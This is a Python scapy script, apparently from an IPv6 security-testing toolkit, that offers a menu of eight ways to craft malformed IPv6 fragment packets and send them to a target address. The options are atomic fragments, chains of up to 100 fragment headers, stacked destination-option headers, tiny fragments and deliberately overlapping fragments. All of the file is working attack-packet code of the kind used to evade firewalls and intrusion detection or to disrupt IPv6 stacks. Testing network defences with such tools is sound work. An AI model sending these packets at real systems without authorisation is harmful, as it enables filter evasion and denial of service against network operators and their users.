#!/usr/bin/python
import random

from scapy.layers.inet import TCP
from scapy.layers.inet6 import getmacbyip6, IPv6, IPv6ExtHdrFragment, PadN, IPv6ExtHdrDestOpt, fragment6, \
    ICMPv6EchoRequest, in6_chksum
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.sendrecv import sendp
from scapy.volatile import RandShort, RandString


def fragmentHeader(interface, smac, sip, dip, sport, dport):
    if smac == "":
        smac = getmacbyip6(sip)
    if sport == "":
        sport = random.randint(10000, 65535)
    sport = int(sport)
    option = int(input("- Insert one of the following options:\n "
                       "1: Sending atomic fragment message\n "
                       "2: Sending 3x atomic fragment message (same id)\n "
                       "3: Sending 3x atomic fragment message (different id)\n "
                       "4: Sending 100x atomic fragment message (same id)\n "
                       "5: Sending 100x atomic fragment message (different id)\n "
                       "6: Sending message containing 2x Destination Header + 2x Fragment Header\n "
                       "7: Sending an ICMPv6 Echo Request message with tiny fragments\n "
                       "8: Sending an ICMPv6 Echo Request message with overlapping\n "
                       "Choose one of 8 options, insert the number (1, 2, 3, ...): "))
    layer3 = IPv6(src=sip, dst=dip)
    layer4 = TCP(sport=sport, dport=dport, ack=0, flags='S')

    if option == 1: # 1 Fragment Header
        fragHdr = IPv6ExtHdrFragment(id=RandShort())
        packet1 = Ether(src=smac)/layer3/fragHdr/layer4
        if interface == "":
            sendp(packet1, verbose=False)
        else:
            sendp(packet1, verbose=False, iface=interface)
        print("Sending atomic fragment message to address: ", dip)
    if option == 2: # 3 Fragment Headers with same ID
        id = RandShort()
        fragHdr = IPv6ExtHdrFragment(id=id)
        for i in range(2):
            fragHdr = fragHdr/IPv6ExtHdrFragment(id=id)
        packet1 = Ether(src=smac) / layer3 / fragHdr / layer4
        if interface == "":
            sendp(packet1, verbose=False)
        else:
            sendp(packet1, verbose=False, iface=interface)
        print("Sending 3x atomic fragment message (same id) to address: ", dip)
    if option == 3: # 3 Fragment Headers with different ID
        id = RandShort()
        fragHdr = IPv6ExtHdrFragment(id=id)
        for i in range(2):
            id = id + 1
            fragHdr = fragHdr / IPv6ExtHdrFragment(id=id)
        packet1 = Ether(src=smac) / layer3 / fragHdr / layer4
        if interface == "":
            sendp(packet1, verbose=False)
        else:
            sendp(packet1, verbose=False, iface=interface)
        print("Sending 3x atomic fragment message (different id) to address: ", dip)
    if option == 4: # 100 Fragment Headers with same ID
        id = RandShort()
        fragHdr = IPv6ExtHdrFragment(id=id)
        for i in range(99):
            fragHdr = fragHdr / IPv6ExtHdrFragment(id=id)
        packet1 = Ether(src=smac) / layer3 / fragHdr / layer4
        if interface == "":
            sendp(packet1, verbose=False)
        else:
            sendp(packet1, verbose=False, iface=interface)
        print("Sending 100x atomic fragment message (same id) to address: ", dip)
    if option == 5: # 100 Fragment Headers with different ID
        id = RandShort()
        fragHdr = IPv6ExtHdrFragment(id=id)
        for i in range(99):
            id = id + 1
            fragHdr = fragHdr / IPv6ExtHdrFragment(id=id)
        packet1 = Ether(src=smac) / layer3 / fragHdr / layer4
        if interface == "":
            sendp(packet1, verbose=False)
        else:
            sendp(packet1, verbose=False, iface=interface)
        print("Sending 100x atomic fragment message (different id) to address: ", dip)
    if option == 6: # 2x Destination Headers + 2x Fragment Headers
        id = RandShort()
        data = Raw(RandString(size=2))
        options = [PadN(optdata=data)]
        for i in range(100):
            options = options + [PadN(optdata=data)]
        desOption = IPv6ExtHdrDestOpt(options=options)/IPv6ExtHdrDestOpt(options=options)
        fragHdr = IPv6ExtHdrFragment(id=id)/IPv6ExtHdrFragment(id=id+1)
        packet1 = Ether(src=smac) / layer3 / desOption / fragHdr / layer4 / Raw(RandString(size=2000))
        if interface == "":
            sendp(packet1, verbose=False)
        else:
            sendp(packet1, verbose=False, iface=interface)
        print("Sending message with 2x Destination Options + 2x Fragment Headers to address: ", dip)
    if option == 7: # Tiny fragments (smaller than minimum MTU 1280
        payload = "ABCDEFGH"
        layer3 = IPv6(src=sip, dst=dip, plen=16) # 16 bytes contains 8 bytes of ICMPv6 Header and 8 bytes of Payload
        icmpv6 = ICMPv6EchoRequest()
        csum = in6_chksum(58, layer3/icmpv6, bytes(icmpv6/payload))
        frag1 = IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
        frag2 = IPv6ExtHdrFragment(offset=1, m=0, id=12345, nh=58) # Avoiding overlapping by setting offset = 1 (8 bytes distance)
        icmpv6 = ICMPv6EchoRequest(cksum=csum)
        packet1 = Ether(src=smac) / layer3 / frag1 / icmpv6
        packet2 = Ether(src=smac) / layer3 / frag2 / payload
        if interface == "":
            sendp(packet1, verbose=False)
            sendp(packet2, verbose=False)
        else:
            sendp(packet1, verbose=False, iface=interface)
            sendp(packet2, verbose=False, iface=interface)
        print("Sending ICMPv6 Echo Request message with tiny fragments to address: ", dip)
    if option == 8: # Overlapping
        payload1 = 'V'*1272
        payload2 = 'A'*1280
        layer3 = IPv6(src=sip, dst=dip, plen=1288) # (1280 bytes Payload 2 + 8 bytes Fragment Header) or (1272 + 8 Frag + 8 ICMPv6)
        icmpv6 = ICMPv6EchoRequest(data=payload1)
        csum = in6_chksum(58, layer3/icmpv6, bytes(icmpv6/payload2))
        icmpv6 = ICMPv6EchoRequest(cksum=csum, data=payload1) # 8 bytes header + 1272 bytes data
        frag1 = IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
        frag2 = IPv6ExtHdrFragment(offset=2, m=0, id=12345, nh=58) # Offset has to be 160 = 1280*8, but 2 offset causes overlapping
        packet1 = Ether(src=smac) / layer3 / frag1 / icmpv6
        packet2 = Ether(src=smac) / layer3 / frag2 / payload2
        if interface == "":
            sendp(packet1, verbose=False)
            sendp(packet2, verbose=False)
        else:
            sendp(packet1, verbose=False, iface=interface)
            sendp(packet2, verbose=False, iface=interface)
        print("Sending ICMPv6 Echo Request message with overlapping to address: ", dip)
